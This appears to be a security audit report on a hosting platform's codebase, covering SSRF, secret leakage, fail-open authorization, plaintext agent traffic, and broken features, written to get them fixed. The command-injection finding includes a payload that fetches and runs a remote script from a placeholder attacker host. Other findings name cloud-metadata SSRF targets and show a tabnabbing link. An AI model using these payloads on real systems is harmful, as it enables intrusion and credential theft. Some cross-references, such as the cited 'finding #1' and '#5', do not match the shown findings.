# ShanuTechX Hosting Platform — Bug Report

## Coverage

- **Fully read, file-by-file:** all of `apps/api/src/lib/*` (~70 files), `apps/api/src/middleware/*`, all `apps/api/src/routes/*` (54 files — spot-checked at varying depth, with full reads of the money/auth/infra-critical ones: orders, domains, secrets, admin, managedDatabases, catalog, deployments, containers, gitConnect, webmailAuth, apiKeys, teams, projectAuth, internalBot, metrics, filesystem), all of `services/node-agent/src/*` (11 files), all of `services/discord-bot/src/*` and `services/whatsapp-bot/src/*`, `packages/client`, `packages/deployments`, `packages/db/scripts`.
- **Spot-checked** (grep-swept for dangerous patterns, then deep-read the flagged/high-value files): `apps/dashboard` (auth guards, sanitizer, API client — a fraction of its 181 files), `apps/mobile-admin` (auth flow), `apps/web` (marketing site — low bug density expected, no auth/money logic there).
- **Not individually read:** the bulk of `apps/dashboard`'s ~180 page/component files and `apps/mobile-admin`'s remaining screens — these are presentational Next.js/React Native UI that mostly just call the already-reviewed API, so the highest-value targets (auth guards, the one custom sanitizer, the API client's route list) were prioritized over exhaustively reading every page component.
- **Deliberately excluded:** `packages/postgrest-js`, `packages/realtime-js`, `packages/auth-js`, `packages/supabase-js`, `packages/storage-js`, `packages/functions-js` — these are vendored, unmodified copies of Supabase's own open-source client libraries, not this project's code.

## Findings, roughly worst-first

---
## `apps/api/src/lib/failoverEngine.ts`

- **Hardcoded fallback DB password on failover** (line ~186): when migrating a managed database whose `credentialRef` is missing or fails to decrypt, the code silently uses the literal password `'db_password_default'` to provision the *new* database container:
  ```js
  let password = 'db_password_default';
  if (db.credentialRef) { try { password = decryptSecret(...); } catch { /* fallback default */ } }
  ```
  Two problems: (1) it's a guessable, hardcoded credential used in production; (2) the DB's `credentialRef` in the DB row is never updated to reflect this new password, so any app/user relying on the original stored credential silently breaks after failover, and nothing surfaces this to an operator. Should generate a strong random password, re-encrypt it, persist the new `credentialRef`, and alert loudly instead of failing silently to a fixed string.
- **Audit log misattribution** (line ~280): automatic/system-triggered failover is logged with `adminId: adminUser.id` where `adminUser` is just "the first admin or dev found in the table" — an arbitrary human gets blamed/credited for a system action they didn't take. Should use a dedicated system actor id or null with `actorRole: 'system'` alone (the field already exists but `adminId` shouldn't point at a real, unrelated human).

## `apps/api/src/lib/abuseDetector.ts`

- **`banUserAndTeardownResources` throws on every automated (non-admin-triggered) ban** (line ~87): `AuditLog.adminId` is a **required foreign key to `User.id`** (see `packages/db/prisma/schema.prisma` model `AuditLog`). When the abuse detector bans a user automatically (no human `actorId`), the code writes:
  ```js
  adminId: actorId || 'SYSTEM_ABUSE_DETECTOR',
  ```
  `'SYSTEM_ABUSE_DETECTOR'` is not a real user id, so `prisma.auditLog.create(...)` violates the FK constraint and throws. The function's own `try { ... } catch (err) { logger.error(...); throw err; }` re-throws it.
  - Callers `apps/api/src/routes/catalog.ts:562` and `apps/api/src/routes/deployments.ts:94` `await` this call with **no try/catch**, directly before `return res.status(403).json({...})`. So on every automated abuse-triggered ban, the intended 403 "account suspended" response never gets sent — the request instead crashes with an unhandled 500, even though the ban, API-key revocation, and deployment teardown all already completed successfully beforehand.
  - No audit log entry ends up existing for the automated ban at all, defeating the stated purpose of "BUG-12 FIX: use SYSTEM_ABUSE_DETECTOR when automated" (the comment claims this was already fixed, but the fix doesn't satisfy the DB constraint).
  - Fix: either add a real system/service user row to seed data and reference its id, or make `adminId` nullable for system actions (there's already an `actorRole` column intended for exactly this — `'system'` — that isn't used here).

## `apps/api/src/lib/sshTerminalGateway.ts`

- **Weaker, inconsistent ownership check duplicated instead of reused** (line ~207): `canAccessResource` is imported but never called; the file re-implements a narrower check: `if (user.role === 'customer' && provision.userId !== user.id) return fail(...)`. This silently allows through any role that isn't `'customer'` (e.g. `'support'`) without verifying assignment/ownership, unlike the shared `canAccessResource` helper which correctly denies unrelated `support` users. **Currently not exploitable in practice** because the only way to reach this code is via a ticket minted in `routes/vps.ts` (`POST /vps-provisions/:id/ssh-ticket`), which does correctly call `canAccessResource` before issuing the ticket — so today's request flow is safe. But this is fragile: any future ticket-issuing call site that forgets that check (or a ticket-replay bug) would grant a `support` user or similar an SSH terminal into any customer's VPS with no ownership check at all. Should call the shared `canAccessResource`/`verifyResourceOwnershipAsync` here too instead of relying entirely on the caller.

## `apps/api/src/lib/uploads.ts` (payment-proof upload)

- **File-type validation trusts only the client-supplied MIME type; extension comes straight from the client-supplied filename** (lines 22-36): `fileFilter` checks `file.mimetype`, which is just the `Content-Type` header the uploader's browser/HTTP client puts on that multipart part — trivially spoofable, no magic-byte/content sniffing. The stored filename's extension is `path.extname(file.originalname)` with **no extension allow-list**, so a client can send `Content-Type: image/jpeg` (passes the filter) with `originalname: "shell.php"` (or `.html`, `.svg`, etc.) and the server will happily write that file to disk as `payments/<orderId>/<timestamp>.php` regardless of what the actual bytes are. If the uploads directory (`UPLOADS_DIR`, e.g. `/var/lib/shanutechx/uploads`) is ever served statically by a web server, or the extension is later trusted anywhere (e.g. `.html`/`.svg` opened inline), this is a stored-content/RCE-adjacent risk. Should validate real content type (e.g. `file-type` sniffing from the buffer/magic bytes) and force the extension from an allow-list derived from the *validated* type, ignoring the client-supplied extension entirely.

## `apps/api/src/lib/subdomain.ts` / `apps/api/src/lib/deployPipeline.ts`

- **Requested custom subdomain silently discarded on conflict, no error surfaced** (`subdomain.ts` lines 80-89, called from `deployPipeline.ts:95`): `generateSubdomain(preferredName, userRequestedSubdomain)` only honors the user's requested subdomain `if (check.valid && check.formatted)`; if it's invalid (reserved word, already taken by another deployment, etc.) it silently falls through to generating an unrelated random one — with no return value or thrown error indicating this happened. `routes/deployments.ts`'s create-deployment handler only regex-validates the *format* of `customSubdomain` via zod (`.regex(...)`) and never calls `validateCustomSubdomain` (which checks the reserved list and DB uniqueness) before calling `deployService`. Net effect: a customer requests `myapp.example.com`, it happens to be reserved/taken, and their deployment goes live at a completely different, randomly generated subdomain (e.g. `app-x7k2p9.example.com`) with zero indication in the API response that their chosen name wasn't used. Fix: call `validateCustomSubdomain` before deployment creation and return a 400 with the specific reason if it fails, rather than silently substituting a random name deep in `generateSubdomain`.

## `apps/api/src/lib/backup.ts` — `restoreBackup()` is broken (double-consumes the S3 stream)

Lines 140-188: the code first fully drains the S3 object body to get a byte array:
```js
const byteArray = await response.Body?.transformToByteArray();
if (!byteArray) { throw new Error('Failed to retrieve backup archive'); }
```
...then **never uses `byteArray` again**. Instead it goes on to pipe `response.Body` a second time into `gunzip.stdin`:
```js
if (response.Body && 'pipe' in response.Body) {
  (response.Body as any).pipe(gunzip.stdin);
} else if (response.Body) {
  const reader = (response.Body as any).getReader();
  ...
}
```
`response.Body` in the AWS SDK v3 is a single-use stream — once `.transformToByteArray()` has consumed it, it's exhausted/locked. The second read (`.pipe()` or `.getReader()`) will either throw (stream already consumed / reader lock error) or yield zero bytes, meaning **every restore attempt will fail or silently pipe an empty archive into `psql`**, restoring nothing. This looks like a merge artifact — two different implementation approaches (buffer-then-write vs. stream-through) got left in the same function. Fix: pick one — either write the already-fetched `byteArray` directly to `gunzip.stdin` (`gunzip.stdin.end(Buffer.from(byteArray))`) and delete the second `response.Body` consumption, or drop the `transformToByteArray()` call entirely and only stream `response.Body` once.

## `apps/api/src/lib/webhooks.ts` / `apps/api/src/routes/webhooks.ts` — SSRF via customer-configured webhook URL

`routes/webhooks.ts` validates the customer-supplied webhook URL with only `url: z.string().url()` — any syntactically valid URL is accepted, with no scheme restriction (http vs https), no private/internal IP blocking, and no DNS-rebinding protection. `fireWebhook()` (`lib/webhooks.ts:149`) then does a server-side `fetch(webhook.url, ...)` whenever a deployment/payment/ticket event fires for that customer — an event the customer themselves can usually trigger (e.g. deploying/redeploying their own app changes its status).

This is a classic SSRF: a customer can register a webhook URL pointing at:
- Internal-only infra explicitly documented elsewhere as "never exposed publicly" (e.g. `env.traefikApiUrl` = `http://traefik:8080`, reachable from the API server's own network),
- Cloud metadata endpoints (`http://169.254.169.254/...`) if hosted on AWS/GCP/etc.,
- Other internal services/ports on the API server's private network (`localhost`, `10.x`, `172.16-31.x`, `192.168.x`),

...and get the API server to make authenticated-by-network-position requests there, with the response behavior (status code/timing) observable indirectly via the `WebhookDelivery` record's `statusCode`/`errorMessage`, giving a blind-SSRF oracle for internal network reconnaissance.

Fix: resolve and validate the webhook host at both creation time and dispatch time — reject private/loopback/link-local IP ranges (including after DNS resolution, to prevent rebinding), require `https://`, and consider a fixed allow-list or an egress proxy that only permits public destinations.

## `apps/api/src/lib/nodeAgentClient.ts` — cluster secret and all agent traffic sent over plaintext HTTP to public node IPs

`agentUrl()` (line ~8) builds `http://${node.ip}:${env.nodeAgentPort}${path}` — **plain HTTP, not HTTPS** — and `node.ip` is the node's *public* IP address (it's populated from `curl -s https://api.ipify.org` during provisioning in `routes/nodes.ts`). Every call to the node agent (`callNodeAgent`, `buildAndRun`, database/LiveKit provisioning, stop/start, etc.) sends the master `x-agent-secret` (`env.nodeAgentSecret` — the same cluster-wide secret used to authorize provisioning brand-new nodes) in a cleartext header, over the public internet, along with request bodies that can include decrypted environment variables, database passwords, and LiveKit API secrets (see `failoverEngine.ts`, `orderFulfillment.ts`).

Anyone positioned on the network path between the API server and a node (an intermediate ISP/hosting-provider network, a compromised router, etc.) can passively capture the cluster secret and any in-flight credentials. Since the same secret is accepted by *every* node's agent (per `services/node-agent/src/index.js`), capturing it once from traffic to any single node compromises the whole fleet. This directly undermines the "shared secret as a second layer of defense" model described in the node-agent's own comments, since the "first layer" (private network) isn't actually in place — the traffic is going over the public internet by construction (`node.ip` is public). Fix: use HTTPS/TLS for all node-agent calls (e.g. via a self-signed cert pinned by the API server, or a WireGuard/private overlay network as the comments elsewhere suggest was the intended design), never plain HTTP with a long-lived shared secret over the public internet.

## `apps/api/src/lib/currency.ts` — "admin-updatable" FX rate doesn't actually exist

The file's own doc comment says the USD→LKR rate is "stored (admin-updatable)" and the hardcoded `DEFAULT_USD_TO_LKR_RATE = 300` is "a starting point, not a live rate." In reality, **every caller** (`routes/billing.ts:87`, `routes/orders.ts:53,57`) calls `convertToLkr(amount, currency)` with no third argument, so they all silently use the hardcoded compile-time constant. There is no settings table, admin endpoint, or any other reference to a configurable FX rate anywhere in the codebase (`grep` for `usdToLkr|exchangeRate|fxRate` across `apps/api`, `apps/dashboard`, and the Prisma schema turns up nothing else). This means the "admin-updatable" feature described in the comments was never actually built — the real exchange rate can only be changed by editing this constant and redeploying, and every USD order is billed/verified against a fixed 1 USD = 300 LKR rate indefinitely, regardless of real-world FX movement. This directly affects revenue (over/under-charging) and payment verification (`paymentMatcher.ts` compares proofs against `totalLkr`, which is derived from this same stale rate).

## `apps/api/src/index.ts` / `apps/api/src/middleware/rateLimit.ts` — per-IP rate limiting and CSRF logging are broken behind the documented reverse proxy

The production deployment (`infra/control-plane/docker-compose.yml`) puts the `api` service behind **Traefik**, terminating TLS and proxying `api.${ROOT_DOMAIN}` → the API container (see the `traefik.http.routers.api.*` labels). However, `apps/api/src/index.ts` never calls `app.set('trust proxy', ...)`, and nothing in the app manually reads `X-Forwarded-For` to determine the real client IP (the only place that even mentions the header is `csrfProtection.ts`'s log statement, which just uses `req.ip` directly).

With Express's default `trust proxy = false`, `req.ip` resolves to the **immediate TCP peer** — i.e. Traefik's own container IP — for every single request in production, not the real client's IP. Consequences:
- `globalLimiter`, `authRateLimiter` (login/signup brute-force protection), `paymentUploadLimiter`, and `smsWebhookLimiter` (all in `middleware/rateLimit.ts`, keyed by `req.ip` via `express-rate-limit`'s default) all bucket **every client on the planet into the same key** (Traefik's address). In practice this means: (a) the 15-attempts-per-15-minutes login limiter isn't per-attacker at all — it's a shared global budget that any user's failed logins eat into, so a small brute-force burst from one IP can lock out login for *every* legitimate user simultaneously; (b) conversely, a distributed attacker (many real source IPs) trivially shares one budget with everyone else and isn't slowed down any more than one attacker would be.
- The `validate: { trustProxy: false }` option passed to `express-rate-limit` only silences that library's own configuration-mismatch warning — it does **not** fix the underlying issue; the real fix is enabling `app.set('trust proxy', 1)` (or the correct hop count) in `index.ts` so `req.ip` reflects `X-Forwarded-For` from the trusted Traefik hop.
- Security-relevant logging (`csrfProtection.ts`'s blocked-origin warning) records the proxy's IP instead of the actual client, making IP-based abuse investigation useless.

## `apps/api/src/routes/metrics.ts` — `/metrics` is publicly reachable, not "internal only" as assumed

The code comment claims `/metrics` has "no auth middleware, matching every real-world Prometheus target; safety comes from network placement (internal Docker network only)." But the documented production Traefik config (`infra/control-plane/docker-compose.yml`) routes the API with `traefik.http.routers.api.rule=Host(api.${ROOT_DOMAIN})` — a **Host-only rule with no `PathPrefix` restriction** — so Traefik forwards every path, including `/metrics`, from the public internet straight to the API container. In this actual deployment, `GET https://api.<rootdomain>/metrics` is reachable by anyone, unauthenticated, exposing Prometheus metrics including business gauges (`activeDeploymentsGauge`, `pendingPaymentsGauge`, `openTicketsGauge` in `lib/metrics.ts`) plus default Node.js process metrics (memory, event-loop lag, GC stats) that aid reconnaissance. Fix: either add a Traefik middleware restricting `/metrics` to the internal network/a specific source IP allowlist, or require the same kind of shared-secret/basic-auth check other internal endpoints use.

## `apps/api/src/routes/secrets.ts` — "add/update one secret" leaks every secret in the project, decrypted

The file explicitly documents "BUG-04 FIX" in two places: the list endpoint (`GET /secrets/projects/:id`) and the bulk-import endpoint both intentionally return `secrets.map(safeListItem)` — metadata only, no decrypted values — specifically so that a dedicated per-key `/reveal` endpoint (with its own audit-logged access) is the only way to see a secret's plaintext.

But endpoint **4, "Add or Update Single Secret"** (`POST /secrets/projects/:id/secrets`, line ~146) does the opposite:
```js
const secrets = await prisma.secretItem.findMany({ where: { projectId: id } });
res.json({
  project: { ..., secrets: secrets.map(decryptItem) }  // <-- decrypts EVERY secret in the project
});
```
So updating (or creating) a single secret returns the **entire project's secret list, fully decrypted**, in the HTTP response — every other secret in that project gets exposed in plaintext to anyone with permission to add/edit just one key. This completely undoes the segregation the "BUG-04 FIX" was meant to establish (client-side code, browser devtools network tab, any request logging/proxy, or a compromised frontend dependency now sees all secrets on every single-secret write, not just the one being written). It's also inconsistent with the bulk-import endpoint two functions later, which correctly uses `safeListItem` for the same kind of response. Fix: change line ~166 to `secrets.map(safeListItem)`, matching every other list-returning endpoint in this file, and return only the newly written secret's own value (if the caller needs to confirm what was saved) via `decryptItem(newOrUpdatedSecret)` alone.

## 🔴 `apps/api/src/routes/gitConnect.ts` — the entire GitHub OAuth callback route is dead code (unterminated comment swallows it)

Lines 71-118. The JSDoc comment meant to document the GitHub App installation callback opens with `/**` on line 71 but is **never closed** with `*/` before the actual route registration:
```ts
/**
 * GitHub App installation callback. GitHub redirects here after the user
 * finishes the "Install App" flow.
gitConnectRouter.get('/git/github/callback', async (req, res: Response) => {
  ...
  ... (full ~40-line handler body) ...
  ...
});

/**
 * GitLab OAuth callback. GitLab redirects here with `code` + our signed
 * `state` after the user authorizes the application.
 */                                          // <-- this closes the ORIGINAL, still-open comment from line 71
gitConnectRouter.get('/git/gitlab/callback', async (req, res: Response) => {
```
Because block comments don't nest, the comment opened at line 71 stays open straight through the entire GitHub callback handler and only actually terminates at the `*/` on line 118 — which was intended to close the *GitLab* callback's docblock. I verified this by mechanically stripping all `/* ... */` blocks from the file: `gitConnectRouter.get('/git/github/callback', ...)` disappears entirely, while the GitLab route survives.

**Effect: the `GET /api/git/github/callback` route is never registered.** After a user installs the GitHub App and GitHub redirects them back to `.../api/git/github/callback?installation_id=...&state=...`, the request 404s — the installation is never linked to the user's account (`prisma.gitHubInstallation.upsert(...)` never runs), and the user is stuck on GitHub's redirect with no confirmation and no working GitHub integration. Given the file's own doc comment says GitHub is the *primary*, PAT-free way to connect a repo, this likely breaks GitHub-based deployments entirely for every user, while GitLab (whose comment block happens to be correctly formed) works fine. Fix: add the missing `*/` after "finishes the 'Install App' flow." (before line 74).

## 🔴 `apps/api/src/routes/managedDatabases.ts` — "Manage Database Users" feature never touches the real database

The `POST /managed-databases/:id/users`, `PATCH /managed-databases/:id/users/:username`, and `DELETE /managed-databases/:id/users/:username` endpoints (lines 360-418, 424-465) only write to the platform's own Prisma metadata table (`prisma.managedDatabaseUser.create/update/deleteMany`). None of them import or call `nodeAgentClient` (or anything else that would reach the actual database container) — contrast with `action`/`delete`/`migrate`/`scale` a bit further down in the same file, which correctly call `containerAction`/`migrateDatabaseContainer`/`scaleDatabaseContainer` on the real node.

Concretely: a customer calls "Create DB user," the API generates a random password, encrypts and stores it, and returns `{ user: { username, password, ... } }` looking exactly like success — but no `CREATE USER ... WITH PASSWORD ...` (or MySQL/Mongo/Redis equivalent) is ever executed against the real running database engine. The user simply doesn't exist there. Any attempt to actually connect an application using these "created" credentials will fail authentication. Same for role/password updates (`PATCH`) and deletion (`DELETE`) — they update/remove bookkeeping rows only, while the real database user (if it happens to exist from some earlier manual step) is left completely untouched. This makes the entire per-database user-management feature non-functional beyond its own admin UI.

## `apps/api/src/routes/managedDatabases.ts` — `scale` endpoint silently drops `storageLimitGb`, and never persists the new `cpuLimit`/`memoryLimitMb`

`POST /managed-databases/:id/scale` (line 588) accepts and validates `cpuLimit`, `memoryLimitMb`, `storageLimitGb`, and `maxConnections`. Only `cpuLimit`/`memoryLimitMb` are actually sent to the real container via `scaleDatabaseContainer(...)` — `storageLimitGb` is never passed to the container call and never written anywhere, so a customer requesting more storage gets a 200 "scaled successfully" response while literally nothing happens. Separately, the Prisma `update` call afterward only persists `maxConnections` and `dbVersion`:
```js
data: {
  ...(parsed.data.maxConnections ? { maxConnections: parsed.data.maxConnections } : {}),
  ...(parsed.data.dbVersion ? { dbVersion: parsed.data.dbVersion } : {}),
},
```
`cpuLimit` and `memoryLimitMb` *are* applied to the real container but are never saved back to the `ManagedDatabase` row, so the platform's own records (and any UI reading them) will show stale CPU/RAM values forever after a scale-up, even though the container itself changed.

## `apps/api/src/routes/catalog.ts` — `POST /catalog/deploy` lets a customer set an arbitrary, unvalidated `subdomain` (reserved-word & uniqueness checks bypassed)

`deploySchema` only requires `projectName: z.string().min(1).optional()` — no format regex, no reserved-word check, no uniqueness check. That raw value flows straight into `composeName` (line 593) and then directly into `Deployment.subdomain` (line 634) with **no call to `validateCustomSubdomain`/`generateSubdomain`** (the functions the rest of the platform uses precisely to block reserved names like `www`/`api`/`admin` and to guarantee uniqueness — see the `subdomain.ts` finding above). Concretely, any authenticated customer can `POST /api/catalog/deploy` with `projectName: "www"` (or `api`, `admin`, or any other deployment's exact existing subdomain) and get a `Deployment` row with that literal `subdomain`, with no collision check against existing deployments.

Separately, note the node-agent (`services/node-agent/src/index.js:958`) *does* sanitize `projectName` before using it as the actual Docker Compose project name (`.replace(/[^a-z0-9-]/gi, '-')`), so this isn't a shell-injection vector — but it means the platform's own `Deployment.subdomain` DB value (raw, customer-supplied) can end up **different from** the sanitized name the container is actually registered under on the node, which is its own source of routing bugs on top of the reserved-word/collision issue. Fix: route `projectName` through the same `validateCustomSubdomain`/reserved-list/uniqueness logic used everywhere else before it's ever persisted as `subdomain`.

## `apps/api/src/routes/webmailAuth.ts` — two issues

1. **Master secrets-vault encryption key reused as JWT signing secret** (lines 68, 142, 191): webmail session tokens are signed and verified with `env.secretsEncryptionKey` — the exact same key `lib/secretsVault.ts` uses for AES-256-GCM encryption of every stored secret platform-wide (VPS root passwords, managed-database passwords, deployment env vars, git tokens, etc., per `lib/secretsVault.ts`, `routes/secrets.ts`, `routes/managedDatabases.ts`). Using one key for two unrelated cryptographic purposes (symmetric encryption-at-rest vs. HMAC token signing) is a key-hygiene violation: any weakness or leak on the JWT side (a `jsonwebtoken` CVE, a verbose error/log that echoes back key material, a brute-force/side-channel opportunity from the high volume of webmail logins) directly threatens the master vault key protecting *everything else* in the platform, not just webmail sessions. These should be two independently-generated secrets.
2. **Non-constant-time password comparison** (line 60): `if (storedPass !== password)` uses JavaScript's native `!==`, which short-circuits on the first differing byte — a timing side channel (unlike the rest of the codebase, which correctly uses `crypto.timingSafeEqual` for secret comparisons elsewhere, e.g. `gateAuth.ts`, `internalBot.ts`). Should decrypt and compare with `crypto.timingSafeEqual` on fixed-length buffers.
3. Minor: `jwt.verify(token, env.secretsEncryptionKey)` (lines 142, 191) doesn't pass an `algorithms: ['HS256']` restriction, unlike `lib/projectAuthService.ts`'s `verifyProjectAuthToken`, which correctly does. Not currently exploitable (no asymmetric keys are in play for this token type to enable classic alg-confusion), but it's an inconsistency with the rest of the codebase's own established best practice and should be tightened for defense-in-depth.

## `apps/dashboard/lib/sanitize.ts` — hand-rolled email-HTML sanitizer has gaps (used to render attacker-controlled inbound email content)

`WebmailMessageViewer.tsx`/`WebmailThreadViewer.tsx` render every inbound email's HTML body via `dangerouslySetInnerHTML={{ __html: sanitizeHtml(message.htmlBody) }}` — i.e. arbitrary, attacker-controlled content (anyone who emails the mailbox) goes through this custom sanitizer and straight into the DOM. Using a hand-rolled sanitizer instead of an audited library (DOMPurify, sanitize-html) for this specific threat model (arbitrary third-party-supplied HTML rendered to a logged-in user) is risky by itself, and this implementation has two concrete gaps:
1. **No `rel="noopener noreferrer"` enforcement on links.** The sanitizer never touches `target`/`rel` attributes. An email containing `<a href="https://attacker.example" target="_blank">Click here</a>` will render as-is; when the recipient clicks it, the attacker's page gets a live `window.opener` handle back to the still-open webmail tab and can do `window.opener.location = 'https://attacker.example/fake-login'` — classic reverse-tabnabbing, letting a received email silently redirect the victim's own dashboard tab to a phishing page after they click any link in it.
2. **URL-scheme filtering is a denylist, not an allowlist**: only `javascript:`, `vbscript:`, `data:text/html`, and `data:text/javascript` are explicitly blocked on `href`/`src`/`action`/`data`/`xlink:href`. Any other scheme not on that list (e.g. `data:image/svg+xml` — which can carry an embedded `<script>` and executes it if top-level-navigated to in some browser/version combinations, or any future/nonstandard scheme) passes through untouched. A safer, standard pattern is allowlisting `http:`/`https:`/`mailto:`/relative URLs and rejecting everything else, rather than trying to enumerate every dangerous scheme.

Fix: switch to DOMPurify (or similar) with a strict, explicit tag/attribute allowlist, and explicitly force `rel="noopener noreferrer"` (and ideally strip `target="_blank"` or route external links through a warning interstitial) on every anchor.

## 🔴 `services/discord-bot/src/slashCommands.js` — `/review-payment` fails OPEN if staff allowlist isn't configured

`isStaffAuthorized()` (line 57-68) ends with:
```js
return ALLOWED_DISCORD_USERS.length === 0 && ALLOWED_DISCORD_ROLES.length === 0;
```
If the operator hasn't set `ALLOWED_DISCORD_ROLES`/`ALLOWED_DISCORD_USERS` env vars (e.g. left blank at initial setup, or on any Discord server not yet configured with an explicit staff role), this function returns `true` for **every single member of the Discord server**, not just staff. Combined with `/review-payment` (line 131), any random Discord member could then approve or decline a customer's payment via the slash command — real, revenue-affecting state changes (`newOrderStatus = 'paid'`, `fulfillOrder(order.id)`, provisioning the ordered service for free) — with zero real authorization.

This matters because the backend endpoint it calls, `POST /api/internal/review-payment` (`apps/api/src/routes/internalBot.ts:152`), performs **no independent staff-identity check of its own** — it trusts the shared `x-internal-secret` header entirely and assumes the bot already verified the caller is staff. So the *only* gate against arbitrary Discord users approving payments is this one fail-open boolean. Fix: default to fail-closed — `isStaffAuthorized` should return `false` (deny) when no allowlist is configured, not `true`, and ideally the API endpoint should require an explicit reviewer role/allowlist check server-side too, not rely entirely on the calling bot's own logic.

## `apps/api/src/routes/internalBot.ts` — customer lookup by "last 9 digits" phone suffix can cross-match different customers

`GET /internal/customer-summary` (used by both the WhatsApp `!deployments`/`!tickets` commands and Discord) resolves the requesting phone number to a user with:
```js
const last9 = phone.slice(-9);
const user = await prisma.user.findFirst({
  where: { OR: [ { phoneNumber: phone }, { phoneNumber: `+${phone}` }, { phoneNumber: { endsWith: last9 } } ] },
});
```
The `endsWith: last9` fallback is meant to handle country-code formatting mismatches, but it means any two customers whose stored phone numbers happen to share the same last 9 digits (plausible with malformed/partial numbers, or genuinely different international numbers) will resolve to whichever one `findFirst` happens to return first — leaking one customer's deployment list and support-ticket subjects/status to a different customer texting from a similar-looking number. Since the WhatsApp Business API normally delivers a fully-normalized E.164 sender number, the safer fix is to drop the fuzzy suffix fallback (or only fall back to it when it uniquely identifies exactly one user, returning "no match" on any ambiguity instead of picking one arbitrarily).

## 🔴 `services/node-agent/src/nodeEngine.js` — OS command injection via `projectName` in `deployDockerCompose`

`deployDockerCompose()` (line ~465) builds a shell command by directly interpolating the caller-supplied `projectName` into a template-literal string executed via `exec` (not `execFile`):
```js
const { stdout, stderr } = await execAsync(`docker compose -f "${composePath}" -p "${projectName}" up -d`);
```
Unlike the sibling endpoint `/agent/compose/up` in `index.js` (which sanitizes `projectName` with `.replace(/[^a-z0-9-]/gi, '-')` before use), the route that reaches this function — `POST /agent/engine/docker/compose` (`index.js:739`) — passes `projectName` through **completely unsanitized**. A `projectName` like `x" && curl http://attacker/sh | sh #` breaks out of the double-quoted argument and injects arbitrary shell commands, executed with whatever privileges the node-agent process runs as (the file's own module doc-comment claims "All commands are executed strictly via child_process.execFile/spawn with argument arrays" and "User inputs are sanitized using strict regex whitelists" — this function violates both claims).

This is reachable end-to-end via `POST /api/nodes/:nodeId/engine/docker/compose` (`apps/api/src/routes/nodeEngine.ts:458`, wired into the dashboard at `apps/dashboard/lib/api.ts:1271`). Exploitability depends on who can reach a given node's agent:
- For the platform's own shared **cluster compute nodes** (the servers hosting *other* customers' apps), `resolveNodeAccess` restricts this to `admin`/`dev` role accounts only — but combined with **finding #1** (any email containing "dev"/"admin" self-promotes to that role) and **finding #5** (the node-agent shared secret travels in plaintext over the public internet), this chains into full root RCE on shared multi-tenant infrastructure reachable by a self-promoted account or anyone who intercepts the cluster secret.
- For a **customer's own leased VPS**, the customer can reach this against their own machine — lower severity since they already have root/SSH access to that box via other legitimate features, but it's still a real command-injection bug that should be fixed at the source regardless of who's allowed to reach it.

Fix: make `deployDockerCompose` use `execFile('docker', ['compose', '-f', composePath, '-p', projectName, 'up', '-d'])` with an argument array (like `/agent/compose/up` already correctly does), or at minimum apply the same `[^a-z0-9-]` sanitization before interpolating into the shell string.

## `apps/dashboard/components/RequireStaffOnly.tsx` / `apps/api/src/routes/tickets.ts` — "dev excluded from support" policy is never actually implemented

`RequireStaffOnly.tsx`'s own doc comment states the intended policy explicitly: *"Gates support-facing sections (tickets, live chat) to admin OR support. Explicitly excludes dev — dev passes the outer /admin/* layout gate ... but that doesn't mean dev should see customer support conversations, which are a different kind of access entirely."* But the actual guard condition is:
```js
const allowed = apiUser?.role === 'admin' || apiUser?.role === 'dev' || apiUser?.role === 'support';
```
— it includes `'dev'`, the opposite of what the comment says. This isn't just a client-side inconsistency either: the backend (`apps/api/src/routes/tickets.ts:96`) uses the same `admin || support || dev` set to decide whether a reply counts as a staff reply, so the intended narrower policy ("dev should not see customer support conversations") isn't enforced anywhere in the stack — `dev`-role accounts have full ticket/live-chat access despite the code's own documentation saying they shouldn't. Fix: remove `'dev'` from the allowed-role checks in both places (or update the comment if the broader access was actually intended and the comment is just stale).

## `apps/dashboard/lib/api.ts` — entire "Leaseweb" VPS API client has no backend implementation

`lib/api.ts` defines a full `api.leaseweb.*` client (config, products, listVps, import, power, console, credentials, snapshots, reinstall, reset-password, ssh-ticket, terminate, firewall, dns — ~18 methods, lines ~1129-1200) all calling `/api/leaseweb/*`. There is no `leaseweb.ts` route file anywhere in `apps/api/src/routes`, no `leasewebRouter` registered in `index.ts`, and no route matching `/api/leaseweb/*` exists at all — every one of these calls would 404. I couldn't find any dashboard page/component that actually imports `api.leaseweb`, so this looks like an unfinished/orphaned feature rather than something currently reachable by users — but it's worth flagging before someone wires a page up to it and ships a silently-broken "Leaseweb VPS" management panel.

## `apps/mobile-admin/src/screens/SplashScreen.tsx` — staff-only gate fails open when the role check itself fails

```js
if (firebaseUser) {
  if (apiUser && apiUser.role === 'customer') {
    navigation.reset({ index: 0, routes: [{ name: 'Login' }] });
  } else {
    navigation.reset({ index: 0, routes: [{ name: 'Main' }] });   // staff console
  }
}
```
The intended check is "if this Firebase-authenticated user is a customer, don't let them into the staff console." But `AuthContext.tsx`'s `refreshApiUser()` sets `apiUser` to `null` whenever `api.auth.me()` throws (network error, API downtime, rate limit, cold-start race). In that case `apiUser && apiUser.role === 'customer'` evaluates to `false` (since `apiUser` is `null`) — not because the role was confirmed non-customer, but because the role couldn't be determined at all — so the `else` branch fires and routes straight into `Main`, the staff admin console, for anyone with *any* valid Firebase login whose role lookup happened to fail at that moment. This is a fail-open pattern where an error/ambiguous state should instead fail closed (route to `Login`, or a neutral "couldn't verify access" screen) rather than defaulting to granting staff-console navigation. The concrete impact is bounded by whether every screen's underlying API call independently enforces role server-side (which, per the rest of this review, the equivalent web endpoints generally do) — but the client-side gate itself doesn't do what its own logic implies it does, and any screen that skips its own auth check because it trusts having reached `Main` at all would be exposed.
